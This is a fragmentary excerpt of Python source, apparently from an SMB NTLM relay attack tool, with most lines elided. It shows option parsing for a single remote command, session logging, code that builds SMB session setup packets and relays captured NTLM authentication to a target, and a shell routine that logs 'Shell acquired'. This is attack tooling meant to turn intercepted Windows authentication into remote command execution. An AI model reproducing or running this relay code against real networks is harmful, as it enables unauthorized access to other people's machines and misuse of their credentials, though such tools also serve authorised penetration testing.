...
parser.add_option(
    "-c", "--command", action="store", help="Single command to run (scripting)", metavar="whoami", dest="OneCommand"
)
...
Logs.basicConfig(
    filemode="w",
    filename=Logs_Path + "logs/SMBRelay-Session.txt",
    level=logging.INFO,
            ...
            if NTLM_Auth:
                ...
                if Packet_NTLM == "\x01":
                    ...
                    if IsSMBAnonymous(NTLM_Auth):
                        ...
                        if Username is not None:
                            head = SMBHeader(
                                cmd="\x73", flag1="\x18", flag2="\x43\xc8", uid=smbdata[32:34], mid="\x03\x00"
                            )
                            t = SMBSessionSetupAndxAUTH(Data=NTLM_Auth)  # Final relay.
                            t.calculate()
                            packet1 = str(head) + str(t)
        ...
        try:
            ...
            if IsSMBAnonymous(NetworkSendBufferPython2or3(data)):
                ...
                if Username is not None:
                    ...
                    head = SMBHeader(
                        cmd="\x73", flag1="\x18", flag2="\x43\xc8", uid=smbdata[32:34].decode("latin-1"), mid="\x03\x00"
                    )
...
def RunShellCmd(data, s, clientIP, Target, Username, Domain):
    ...
    if data[8:10] == b"\x75\x00" and OneCommand == None:
        if Pivoting[0] == "1":
            ...
            ShowHelp()
        Logs.info(
            "Client:" + clientIP + ", " + Domain + "\\" + Username + " --> Target: " + Target[0] + " -> Shell acquired"
        )
...
def serve_thread_tcp(host, port, handler):
    try:
        ...
        print(
            color(
                "Error starting TCP server on port " + str(port) + ", check permissions or other servers running.", 1, 1
            )
        )
